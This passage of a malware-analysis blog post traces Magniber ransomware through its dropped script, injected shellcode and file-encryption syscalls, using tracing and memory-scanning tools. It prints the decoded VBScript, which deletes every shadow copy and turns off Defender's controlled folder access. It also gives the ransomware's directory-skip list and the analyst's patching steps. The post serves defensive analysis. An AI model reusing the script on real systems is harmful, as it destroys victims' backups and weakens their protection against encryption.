    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span></template>

  <table data-hpc class="highlight tab-size js-file-line-container" data-tab-size="8" data-paste-markdown-skip data-tagsearch-path="magni_decoded.vbs">
        <tr>
          <td id="file-magni_decoded-vbs-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-magni_decoded-vbs-LC1" class="blob-code blob-code-inner js-file-line">On Error Resume Next</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-magni_decoded-vbs-LC2" class="blob-code blob-code-inner js-file-line">Set dd4y336wf97z = GetObject(&quot;winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2&quot;)</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-magni_decoded-vbs-LC3" class="blob-code blob-code-inner js-file-line">Set s1o28iq = dd4y336wf97z.ExecQuery(&quot;Select * From Win32_ShadowCopy&quot;)</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-magni_decoded-vbs-LC4" class="blob-code blob-code-inner js-file-line">For Each d18706x in s1o28iq</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-magni_decoded-vbs-LC5" class="blob-code blob-code-inner js-file-line">d18706x.Delete_</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-magni_decoded-vbs-LC6" class="blob-code blob-code-inner js-file-line">Next</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-magni_decoded-vbs-LC7" class="blob-code blob-code-inner js-file-line">Set c6406r7uh = GetObject(&quot;winmgmts:{impersonationLevel=impersonate}!\\.\root\Microsoft\Windows\Defender:MSFT_MpPreference&quot;)</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-magni_decoded-vbs-LC8" class="blob-code blob-code-inner js-file-line">Set jlfze3cy1qjq = c6406r7uh.Methods_(&quot;Set&quot;).inParameters.SpawnInstance_()</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-magni_decoded-vbs-LC9" class="blob-code blob-code-inner js-file-line">jlfze3cy1qjq.Properties_.Item(&quot;EnableControlledFolderAccess&quot;) = 0</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-magni_decoded-vbs-LC10" class="blob-code blob-code-inner js-file-line">Set ub7mu3 = c6406r7uh.ExecMethod_(&quot;Set&quot;, jlfze3cy1qjq)</td>
        </tr>
        <tr>
          <td id="file-magni_decoded-vbs-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-magni_decoded-vbs-LC11" class="blob-code blob-code-inner js-file-line">WScript.Quit Err.Number</td>
        </tr>
  </table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/hasherezade/c93834738a12b1daaa1c06bdb3ea00f2/raw/41b26618a56bf166aacda910fd6e9e1841d00f18/magni_decoded.vbs" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/hasherezade/c93834738a12b1daaa1c06bdb3ea00f2#file-magni_decoded-vbs" class="Link--inTextBlock">
          magni_decoded.vbs
        </a>
        hosted with &#10084; by <a class="Link--inTextBlock" href="https://github.com">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p>As we can see, the script is responsible for deleting shadow copies. It also try to change the system settings, in order to expand what files it can access.</p>



<p>After being run, the script is deleted.</p>



<h3 class="wp-block-heading">Revealing the second stage shellcode</h3>



<p>The inital sample has been terminated, but nevertheless, looking at the symptoms, we can conclude that the ransomware continued its execution:  any newly created files with particular extensions keep getting encrypted. Probably the modules got injected into other processes. This observation can be confirmed by looking at the tracelog:</p>



<pre class="wp-block-preformatted">[...]
<strong>&gt; 15460000+8;SYSCALL:0x26(NtOpenProcess)</strong>
<strong>&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)</strong>
&gt; 15470000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 15490000+8;SYSCALL:0x19(NtQueryInformationProcess)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 154a0000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 154b0000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 154c0000+8;SYSCALL:0x3a(NtWriteVirtualMemory)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 154d0000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 154e0000+8;SYSCALL:0x50(NtProtectVirtualMemory)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 154f0000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
<strong>&gt; 15500000+8;SYSCALL:0xc1(NtCreateThreadEx)</strong>
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 15510000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
<strong>&gt; 15530000+8;SYSCALL:0x52(NtResumeThread)</strong>
[...]</pre>



<p>As we can see in the log, the malware was looping over processes, writing to some of them, and executing the written content in a new thread.</p>



<p>In order to reveal where the implanted modules are located, I scanned the system with <a href="https://github.com/hasherezade/hollows_hunter" target="_blank" rel="noreferrer noopener">HollowsHunter</a> (as an Administrator), with a parameter <code>/shellc</code>  &#8211; to dump all the shellcodes. It turned out that there are multiple processes infected with the same piece of a shellcode. Example:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9190" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/dump_report-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png" data-orig-size="541,865" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dump_report-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png?w=188" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png?w=541" loading="lazy" width="541" height="865" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png" alt="" class="wp-image-9190" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png 541w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png?w=94&amp;h=150 94w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png?w=188&amp;h=300 188w" sizes="(max-width: 541px) 100vw, 541px" /></figure>



<p></p>



<p></p>



<p>Looking at the shellcode strings, we can see that it has a PNG embedded (that is probably the used wallpaper), and as well some HTML and JavaScript:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8785" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/dumped_shc_strings/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png" data-orig-size="738,559" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dumped_shc_strings" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png?w=396" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png?w=640" loading="lazy" width="738" height="559" src="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png" alt="" class="wp-image-8785" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png 738w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png?w=150&amp;h=114 150w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png?w=396&amp;h=300 396w" sizes="(max-width: 738px) 100vw, 738px" /></figure>



<p>The same content of obfuscated JavaScript can be found in Magniber&#8217;s README:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8788" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/readme2/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png" data-orig-size="764,69" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="readme2" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png?w=640" loading="lazy" width="764" height="69" src="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png?w=764" alt="" class="wp-image-8788" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png 764w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png?w=400 400w" sizes="(max-width: 764px) 100vw, 764px" /></figure>



<p>By dumping all the strings from the shellcode, with the help of <a rel="noreferrer noopener" href="https://github.com/mandiant/flare-floss" target="_blank">FLOSS</a>, we can see some more things hinting that this shellcode belongs to our ransomware:</p>



<pre class="wp-block-preformatted">[...]
FLOSS static Unicode strings
\??\
0123456789abcdef
f0123456789
vieijibfm
mstrxoorvdmynkde
<strong>documents and settings
appdata
local settings
sample music
sample pictures
sample videos
tor browser
recycle
windows
boot
intel
msocache
perflogs
program files
programdata
recovery
system volume information
winnt</strong>
README.html
Users\Public\
wscript.exe /B /E:VBScript.Encode ../../Users/Public/
.mnxu</pre>



<p>For example, there is a list of well known directories. Such lists are often used by ransomware to skip particular system directories. There are also strings related to the dropped VBE script, and the hardcoded ransomware extension: <code>vieijibfm</code>. </p>



<p>Overall, we can confirm with a high level of a confidence that the captured shellcode belongs to Magniber.</p>



<p>We can <a href="https://github.com/hasherezade/hollows_hunter/wiki#killing-or-suspending-detected-processes" target="_blank" rel="noreferrer noopener">run HollowsHunter with option <code>/kill</code></a> in order to kill all the infected and suspicious processes. To confirm that the ransomware is no longer active in the system, we can make another experiment with creating a new file with one of the attacked extensions. This time the new file won&#8217;t get encrypted &#8211; meaning all the processes containing Magniber are killed.</p>



<h2 class="wp-block-heading">The second stage &#8211; Magniber&#8217;s core</h2>



<p><a rel="noreferrer noopener" href="https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection" target="_blank">3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a</a> &#8211; the shellcode#2</p>



<hr class="wp-block-separator has-alpha-channel-opacity" />



<p>We can make an educated guess that the dumped shellcode is the unpacked Magniber&#8217;s core. So, we will continue our tracing from this point.</p>



<p>In order to trace a shellcode, I have to wrap it as an executable. Similarly to the first stage, the shellcode is 64bit.</p>



<p>There are various ways to make a PE out of a shellcode. I decided to simply add it as a new section to the first stage executable, and then redirect the Entry Point there:</p>



<figure class="wp-block-image size-large is-resized"><img data-attachment-id="8851" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/pebear_add_shellc/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png" data-orig-size="754,319" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pebear_add_shellc" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png?w=640" loading="lazy" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png?w=754" alt="" class="wp-image-8851" width="670" height="283" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png?w=670 670w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png?w=400 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png 754w" sizes="(max-width: 670px) 100vw, 670px" /></figure>



<p><em>Adding the section with the dumped shellcode (using PE-bear)</em></p>



<figure class="wp-block-image size-large"><img data-attachment-id="8852" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/pebear_redirect_ep/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png" data-orig-size="886,571" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pebear_redirect_ep" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png?w=640" loading="lazy" width="886" height="571" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png?w=886" alt="" class="wp-image-8852" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png 886w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png?w=400 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png?w=768 768w" sizes="(max-width: 886px) 100vw, 886px" /></figure>



<p><em>Redirection of Entry Point to the newly added shellcode</em></p>



<p>First, I tested if the file executes properly, just by running it as a standalone on my VM. Everything works as expected: files got encrypted, and the wallpaper changes. So, that indeed it is the main part of the ransomware, responsible for encryption of the files.</p>



<p>Then I rolled back the VM, and run it once again &#8211; this time via TinyTracer. It turned out to work well. However, the tracing again breaks on the new process creation (used for UAC). It is called via syscall. In contrast to the previous part, this time the call is made from the static code (saved in the PE section, rather than in a dynamically allocated memory), so it is easy to patch it out. I did it just by NOP-in the syscall in PE-bear.</p>



<p>Syscall responsible for executing <code>NtCreateUserProcess</code> viewed in PE-bear:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8860" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/syscall_to_nop-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png" data-orig-size="904,176" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="syscall_to_nop-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png?w=640" loading="lazy" width="904" height="176" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png?w=904" alt="" class="wp-image-8860" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png 904w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png?w=400 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png?w=768 768w" sizes="(max-width: 904px) 100vw, 904px" /></figure>



<p>The same syscall after being NOP-ed out:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8861" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/after_nop-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png" data-orig-size="902,130" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="after_nop-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png?w=640" loading="lazy" width="902" height="130" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png?w=902" alt="" class="wp-image-8861" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png 902w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png?w=400 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png?w=768 768w" sizes="(max-width: 902px) 100vw, 902px" /></figure>



<p>Now the tracing proceeds further, to the files encryption.</p>



<p>Just like in the previous case, first I traced it without parameters, to have an overview of what functions are going to be called, and then added relevant entries into <code>parameters.txt</code>. Some new function has been added, comparing with the part 1.</p>



<pre class="wp-block-preformatted">ntdll;NtQueryDirectoryFile;10<br>ntdll;NtQueryInformationProcess;5<br>ntdll;NtSetInformationFile;5</pre>



<p>The malware keeps running for quite a while (as the execution is slowed down because of the instrumentation with Pin), but we can preview the log in the real time with the help of tools like baretail.  By looking at the executed function it seems to be indeed files encryption. Waiting for full system encryption  to finish makes no sense, so I decided to break the execution manually and terminate the process.</p>



<p>Fragment of the resulting tracelog:</p>



<pre class="wp-block-preformatted">2000;section: [shellc]
19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {\xbf\xd8\xd2\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {\xc5\xf9\xd2\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {\x19\xfc\xd2\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {m\x06\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {\xb8\x08\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {P\x0a\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {\xc0\x0b\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {E\x0d\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -&gt; {\xc2\x0e\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

196aa;SYSCALL:0x34(NtDelayExecution)
1969f;SYSCALL:0x19(NtQueryInformationProcess)
1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014fb08 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014fb00 -&gt; {\x10\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0x14801af200001000 = 1477210304461934592
	Arg[5] = 0x14d8106a00000004 = 1501968523180638212

196d6;SYSCALL:0x33(NtOpenFile)
NtOpenFile:
	Arg[0] = ptr 0x000000000014faf8 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = 0x0000000000100080 = 1048704
	Arg[2] = ptr 0x000000000014fa90 -&gt; L"0"
	Arg[3] = ptr 0x000000000014fa58 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0x14801af200000001 = 1477210304461930497
	Arg[5] = 0x14d8106a00000021 = 1501968523180638241
[...]</pre>



<p>By looking at the tracelog, we can clearly see fragments that resemble file encryption. Relevant fragments:</p>



<pre class="wp-block-preformatted">1972e;SYSCALL:0x11(NtQueryInformationFile)
<strong>196c0;SYSCALL:0x55(NtCreateFile)</strong>
NtCreateFile:
	Arg[0] = ptr 0x000000000014ef08 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = 0x0000000000120116 = 1179926
	Arg[2] = ptr 0x000000000014eb88 -&gt; L"0"
	Arg[3] = ptr 0x000000000014eae0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0
	Arg[5] = 0x0000000000000080 = 128
	Arg[6] = 0x0000000000000003 = 3
	Arg[7] = 0x0000000000000001 = 1
	Arg[8] = 0x0000000000000120 = 288
	Arg[9] = 0

1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014ea78 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014eac8 -&gt; {\x00\x01\x10\x00\x00\x00\x00\x00}
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4

1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014eaa0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014ea68 -&gt; {\x00\x01\x10\x00\x00\x00\x00\x00}
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4

<strong>196e1;SYSCALL:0x6(NtReadFile)
196cb;SYSCALL:0x8(NtWriteFile)</strong>
NtWriteFile:
	Arg[0] = 0x0000000000000470 = 1136
	Arg[1] = 0
	Arg[2] = 0
	Arg[3] = 0
	Arg[4] = ptr 0x000000000014ea38 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[5] = ptr 0x00000000163c0000 -&gt; {\x01`\xa4\x13H\xc7w.}
	Arg[6] = 0x00000000000005a0 = 1440
	Arg[7] = 0
	Arg[8] = 0

1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014ea70 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014eaa8 -&gt; {\x00\x01\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014e890 -&gt; {\x16)\xb4\xb4\x05C\xd0\x92}
	Arg[1] = 0

[...]

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014e890 -&gt; {h\xa1\xe1\x9e\x04\x00\x00\x00}
	Arg[1] = 0

<strong>196cb;SYSCALL:0x8(NtWriteFile)</strong>
NtWriteFile:
	Arg[0] = 0x0000000000000470 = 1136
	Arg[1] = 0
	Arg[2] = 0
	Arg[3] = 0
	Arg[4] = ptr 0x000000000014ea38 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[5] = ptr 0x0000000013990000 -&gt; {\xe4|\xfa\x96\xeb!\x89\xea}
	Arg[6] = 0x0000000000000100 = 256
	Arg[7] = 0
	Arg[8] = 0

19689;SYSCALL:0x1e(NtFreeVirtualMemory)
196b5;SYSCALL:0xf(NtClose)
196b5;SYSCALL:0xf(NtClose)
196b5;SYSCALL:0xf(NtClose)</pre>



<p>Files are repeatedly read, and then written to. We can see a heavily use of the function <code><a href="https://learn.microsoft.com/is-is/windows/win32/devnotes/ntqueryperformancecounter">NtQueryPerformanceCounter</a></code> in each such round. This function is a low-level equivalent of <code><a href="https://learn.microsoft.com/en-us/windows/win32/api/profileapi/nf-profileapi-queryperformancecounter">QueryPerformanceCounter</a></code>, which MSDN explains in the following way:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Retrieves the current value of the performance counter, which is a high resolution (&lt;1us) time stamp that can be used for time-interval measurements.</p>
</blockquote>



<p>I suspect that this ransomware uses it as a source of entropy, but we will see if this assumption is valid using static analysis&#8230;</p>



<h2 class="wp-block-heading">Going deeper&#8230;</h2>



